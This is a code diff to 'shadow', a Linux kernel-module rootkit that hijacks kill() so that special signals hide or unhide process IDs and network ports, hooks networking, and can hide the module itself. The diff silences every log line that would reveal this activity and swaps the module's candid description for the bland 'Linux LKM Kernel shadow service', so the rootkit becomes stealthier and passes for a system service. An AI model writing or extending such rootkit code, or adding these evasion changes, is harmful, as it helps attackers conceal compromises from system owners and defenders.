@@ -70,7 +70,7 @@ static int fake_kill(struct pt_regs *regs)
             }
             strncpy(hide_pids[hide_pids_count], pid_str, PID_LEN);
             hide_pids_count++;
-            pr_info("shadow: Signal 64 received. Hiding PID %d\n", pid);
+            //pr_info("shadow: Signal 64 received. Hiding PID %d\n", pid);
             return 0;
 
         case SIG_UNHIDE_PID:
@@ -81,7 +81,7 @@ static int fake_kill(struct pt_regs *regs)
                         strncpy(hide_pids[j], hide_pids[j+1], PID_LEN);
                     }
                     hide_pids_count--;
-                    pr_info("shadow: Signal 63 received. Unhiding PID %d\n", pid);
+                    //pr_info("shadow: Signal 63 received. Unhiding PID %d\n", pid);
                     return 0;
                 }
             }
@@ -94,7 +94,7 @@ static int fake_kill(struct pt_regs *regs)
             }
             hide_ports[hide_ports_count] = (u16)pid;
             hide_ports_count++;
-            pr_info("shadow: Signal 62 received. Hiding port %d\n", pid);
+            //pr_info("shadow: Signal 62 received. Hiding port %d\n", pid);
             return 0;
 
         case SIG_UNHIDE_PORT:
@@ -104,7 +104,7 @@ static int fake_kill(struct pt_regs *regs)
                         hide_ports[j] = hide_ports[j+1];
                     }
                     hide_ports_count--;
-                    pr_info("shadow: Signal 61 received. Unhiding port %d\n", pid);
+                    //pr_info("shadow: Signal 61 received. Unhiding port %d\n", pid);
                     return 0;
                 }
             }
@@ -291,15 +291,15 @@ static int __init shadow_init(void)
     fh_install_hooks(network_hooks, ARRAY_SIZE(network_hooks));
 
     if (!iterate_hooked || !kill_hooked) {
-        pr_err("shadow: Failed to install essential hooks\n");
+        pr_err("shadow: Failed to installed\n");
         return -ENOENT;
     }
     
     if (self_hide) {
         hide_module();
-        pr_info("shadow: Loaded in HIDDEN mode.\n");
+        //pr_info("shadow: Loaded in 1 mode.\n");
     } else {
-        pr_info("shadow: Loaded in VISIBLE mode.\n");
+        //pr_info("shadow: Loaded in 0 mode.\n");
     }
     
     return 0;
@@ -316,11 +316,11 @@ static void __exit shadow_exit(void)
     for (i = 0; i < ARRAY_SIZE(kill_hooks); i++) fh_remove_hook(&kill_hooks[i]);
     fh_remove_hooks(network_hooks, ARRAY_SIZE(network_hooks));
     
-    pr_info("shadow: Unloaded\n");
+    //pr_info("shadow: Unloaded\n");
 }
 
 module_init(shadow_init);
 module_exit(shadow_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("test");
-MODULE_DESCRIPTION("LKM shadow for hiding processes and network connections via RT signal hijacking with pt_regs support");
+MODULE_AUTHOR("GPL");
+MODULE_DESCRIPTION("Linux LKM Kernel shadow service");
